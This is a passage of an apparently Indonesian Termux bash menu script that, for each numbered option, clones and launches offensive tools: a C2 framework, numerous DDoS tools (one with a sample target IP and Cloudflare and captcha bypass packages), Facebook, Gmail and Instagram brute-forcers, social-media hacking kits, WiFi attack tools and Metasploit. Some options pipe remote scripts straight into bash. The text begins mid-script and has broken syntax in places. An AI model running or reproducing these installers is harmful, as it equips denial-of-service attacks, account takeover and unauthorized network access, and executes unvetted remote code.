apt update && apt upgrade && pkg update && pkg upgrade
pkg install curl
pkg install wget
pkg install python3
pkg install git
pkg install figlet
 git clone https://github.com/MrSanZz/MuffinC2
 cd MuffinC2
 python3 setup.py
    python3 mc2.py    
    clear
    echo -e $green"Done Installed..."
fi
  if [ $HOZOO = 63 ] || [ $HOZOO = 63 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
  pkg update && apt upgrade
pkg install git
pkg install python3
git clone https://github.com/MrSanZz/starlink-ddos
cd starlink-ddos
chmod +x *
pip3 install -r requirements.txt
python3 starlink.py  
    clear
    echo -e $green"Done Installed..."
fi
  if [ $HOZOO = 64 ] || [ $HOZOO = 64 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
    echo $red "
    git clone https://github.com/Destroyer-official/Destroyer-DoS.git 
    
    cd Destroyer-DoS
    
    pip install -r requirements.txt
    
    python ddos.py -ip 192.168.0.1 -p 80 -pr 40 -t 20  
    
    
    
    "
    clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 65 ] || [ $HOZOO = 65 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
    git clone https://github.com/BINOD-XD/RXS-DDoS/
cd RXS-DDoS
npm i requests
npm i https-proxy-agent
npm i crypto-random-string
npm i events
npm i fs
npm i net
npm i cloudscraper
npm i request
npm i hcaptcha-solver
npm i randomstring
npm i cluster
npm i cloudflare-bypasser
pip3 install -r requirements.txt
pkg install golang
wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
apt-get install ./google-chrome-stable_current_amd64.deb
ulimit -n 999999
chmod 777 *
python3 ddos.py
    clear
    echo -e $green"Done Installed..."
    if [ $HOZOO = 66 ] || [ $HOZOO = 66 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
    echo $red "Silakan pilih script untuk di DDOS"
    
    echo $green "
    
git clone https://github.com/moulik-source/ddos
 cd ddos
python ddos.py http://target 
"
    clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 67 ] || [ $HOZOO = 67 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
termux-setup-storage
apt update && apt upgrade -y
pkg install python3
pkg install rust
pkg install git
pkg install python-cryptography
pip install setuptools
git clone https://github.com/NamBel12/ToolDDoS.git
cd ToolDDoS
pip install -r requirements.txt
python3 ddos.py    
    clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 68 ] || [ $HOZOO = 68 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
    git clone https://github.com/Pastlecry/FireLemon 
    cd FireLemon 
    pip install -r requirements.txt 
    python -m pip install -r requirements.txt 
   python FireLemon.py 
   python3 FireLemon.py
    clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 69 ] || [ $HOZOO = 69 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
apt-get update -y && apt-get install git && git clone https://github.com/Cyber-218/DDos-Tool.git && cd DDoS-Tool && python3 DDoS_Tool.py    
    clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 70 ] || [ $HOZOO = 70 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
    
    clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 71 ] || [ $HOZOO = 71 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
 pkg install wget -y && wget https://github.com/DrDataYE/DrDos/releases/download/drdos/drdos_1.1.0_all_termux.deb && dpkg -i drdos_1.1.0_all_termux.deb   
    clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 72 ] || [ $HOZOO = 72 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
   git clone https://github.com/MIISTERC/DDos-Blitz
cd DDos-Blitz
bash setup.sh 
    clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 73 ] || [ $HOZOO = 73 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
    
    clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 74 ] || [ $HOZOO = 74 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
    git clone https://github.com/thenurhabib/warlof.git
cd warlof
bash setup.sh
python3 warlof.py --help
    clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 75 ] || [ $HOZOO = 75 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
pkg update
pkg install python3 python3-pip git -y
git clone https://github.com/LimerBoy/Impulse
cd Impulse/
pip3 install -r requirements.txt
python3 impulse.py --help    
    clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 76 ] || [ $HOZOO = 76 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
    echo $red"SILAKAN COPY SC DDOS NYA "
    echo $green"
    apt install git python -y 
    git clone https://github.com/danitechid/ddos-script 
    cd ddos-script 
    pip install requests colorama 
    python main.py https://example.com 100
    "
    clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 77 ] || [ $HOZOO = 77 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
    git clone https://github.com/IAmBlackHacker/Facebook-BruteForce
cd Facebook-BruteForce
python3 -m pip install requests bs4
python3 -m pip install mechanize
 python3 fb.py or python fb2.py
    clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 78 ] || [ $HOZOO = 78 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
    git clone https://github.com/NullPulse/SocialMediaHackingToolkit
cd SocialMediaHackingToolkit
cd dependencies
sudo dpkg -i windscribe-cli.deb
windscirbe login 
cd ../cmd
pip3 install -r requirements.txt
cd ..
chmod +x linux.sh
./linux.sh
    clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 79 ] || [ $HOZOO = 79 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
git clone https://github.com/fikrado/fikrado.py
cd fikrado.py
bash termux.sh
python2 fikrado.py

    clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 80 ] || [ $HOZOO = 80 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
    echo $red "SILAKAN PILIH DAN CCOPY SCRIPT HACKINH NYA"
    echo $green "
    git clone https://github.com/m-primo/Facebook-Brute-Force
    cd Facebook-Brute-Force
    pip install -r primo-pip-reqs.txt
    python app.py -u <USERNAME/ID/EMAIL/PHONE> -p <PASSWORD_LIST_FILENAME>
    "
    clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 81 ] || [ $HOZOO = 81 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
apt update && apt upgrade
pkg install python
pkg install git
git clone https://github.com/STARK-404/FB-HACK/
cd FB-HACK 
pip install -r requirments.txt
python Run.py
    clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 82 ] || [ $HOZOO = 82 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
 apt-get install git
git clone https://github.com/FantoX/SocialBox-Bruteforce.git
cd SocialBox
chmod +x SocialBox.sh
chmod +x install-sb.sh
./install-sb.sh
./SocialBox.sh   
    clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 83 ] || [ $HOZOO = 83 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
echo $yellow"halo gusy kali ini saya akan menggasi tutorial cara install debian 13 yok ikuti cara dan pahami dan teli 
bahan bahan di bawah "
echo $green "
termux-setup-storage 
pkg install git 
pkg install wget -y 
pkg install curl 
pkg install wget -y ; wget https://raw.githubusercontent.com/wahasa/Debian/main/install.sh ; chmod +x install.sh ; ./install.sh
JIKA SUDAH KE INSTALL DEBIAN 13 NYA PROSES UDAH SELESAI KAMU HARUS KETIK HURUF KECIL PERINTAH UNTUK JALANKAN DEBIAN 13 CONTIH HURUF KECIL
 
debian 
JIKA SUDAH MUNCUL LOCALHOST---> 
ANDA HARUS INSTALL MODULE NYA 

apt install update
apt install git 
apt install wget -y 
apt install curl -y 
 Y/N JAWAB Y SEMUA 
 JIKA SUDAH PROSES SELESAI GUSY SALIN DALAM TKS NYA 
 apt install wget -y ; wget https://raw.githubusercontent.com/wahasa/Debian/main/Desktop/de-xfce.sh ; chmod +x de-xfce.sh ; ./de-xfce.sh
 
 JIKA SUDAH GUSY 
 
PILIH ASIA DAN PILIH JUGA INDONESIA TERIMAKASI 

"
    clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 84 ] || [ $HOZOO = 84 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
    xdg-open "https://snaptik.app/ID"
    clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 85 ] || [ $HOZOO = 85 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
    xdg-open "https://play.google.com/store/apps/details?id=com.iiordanov.freebVNC"
    clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 86 ] || [ $HOZOO = 86 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
     apt update
 apt upgrade
apt install git
git clone https://gitlab.com/0xsolo/t-mux-banner.git $ cd T-mux-Banner
 bash install
 bash TXB.sh
    clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 87 ] || [ $HOZOO = 87 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
apt update && apt upgrade -y
pkg install git
pkg install python
rm -rf OP-BANNER
git clone --depth=1 https://github.com/U7P4L-IN/OP-BANNER.git
cd OP-BANNER
python2 Banner.py    
    clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 88 ] || [ $HOZOO = 88 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
 pkg i wget && wget https://raw.githubusercontent.com/Genplat/awesome-termux/main/install.sh && bash install.sh   
    clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 89 ] || [ $HOZOO = 89 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
    git clone https://github.com/ByCh4n/BCHackTool
cd BCHackTool
chmod +x bchacktool-termux.sh
./bchacktool-termux.sh
    clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 90 ] || [ $HOZOO = 90 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
    apt update
apt upgrade
apt install git
git clone https://github.com/mishakorzik/UserFinder
cd UserFinder
bash UserFinder.sh
    clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 91 ] || [ $HOZOO = 91 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
    apt install git 
    git clone https://github.com/GH05T-HUNTER5/GH05T-INSTA 
    cd GH05T-INSTA 
    bash setup.sh 
    clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 92 ] || [ $HOZOO = 92 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
    wget https://raw.githubusercontent.com/laraib07/TermuxBackupTools/master/rewind && chmod u+x rewind && mv rewind $PREFIX/bin/
    clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 93 ] || [ $HOZOO = 93 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
    pkg install python2 && git clone https://github.com/darkhunter141/Web-Hunter && cd Web-Hunter && python2 menu.py
    clear
    echo -e $green"Done Installed..."
fi 
if [ $HOZOO = 94 ] || [ $HOZOO = 94 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
     apt-get update -y && apt-get upgrade -y
apt-get install git -y
 git clone https://github.com/DarkNuke090/NetHunter
 cd NetHunter
chmod +x setup.sh
 bash setup.sh
    clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 95 ] || [ $HOZOO = 95 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
pkg install wget -y
wget https://ghproxy.com/github.com/UtermuxBlog/termux-metasploit/raw/main/installer.sh
chmod +x installer.sh
./installer.sh    
    clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 96 ] || [ $HOZOO = 96 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
    wget -qO- https://github.com/E343IO/shorturl/raw/main/setup | bash 
    clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 97 ] || [ $HOZOO = 97 ]
    then
    
    echo -e $green" Installing..."
    sleep 1
     git clone https://github.com/d4az/gmail-hack.git 
      chmod +x hack-gmail.sh     
./hack-gmail.sh --help
   
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 98 ] || [ $HOZOO = 98 ]
    then
   
    echo -e $green" Installing..."
    sleep 1
    echo $green "
    apt update 
apt install git 
apt install python
apt install python3
apt install cmatrix
git clone https://github.com/akashblackhat/wifi-hacking.py.git
ls
cd wifi-hacking.py
ls
python3 wifi-hacking.py
"
    
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 99 ] || [ $HOZOO = 99 ]
    then
    
    echo -e $green" Installing..."
    sleep 1
echo $green"
    apt update && apt upgrade
pkg install git python python2
git clone https://github.com/naiyan-official/wifisky 
chmod +x install.sh
bash install.sh
 python2 wifisky.py
"
    
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 100 ] || [ $HOZOO = 100 ]
    then
    
    echo -e $green" Installing..."
    sleep 1
    echo $green""
    git clone https://github.com/JoyGhoshs/Airattackit/
cd Airattackit
chmod +x install.sh
./install.sh
""
    
    echo -e $green"Done Installed..."
fi
fi
if [ $HOZOO = UPDATE ] || [ $HOZOO = UPDATE ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
git clone https://github.com/SPOKYHOZOOO/KANDURA-ANONYOMOUS
 cd KANDURA-ANONYOMOUS
bash TOOLS8.sh
  clear
    echo -e $green"Done Installed..."
fi

if [ $HOZOO = LAPOR ] || [ $HOZOO = LAPOR ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
xdg-open "https://wa.me/6289661956633?text=.Bang-UPDATE-LAH-SCRIPT-GG-MU🐰🚬"
  clear
    echo -e $green"Done Installed..."
fi

if [ $HOZOO = SUPPROT ] || [ $HOZOO = SUPPROT ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
xdg-open "https://www.tiktok.com/@cyber_hozoo_nethunter999?_t=8loTfgVdX17&_r=1"
  clear
    echo -e $green"Done Installed..."
fi





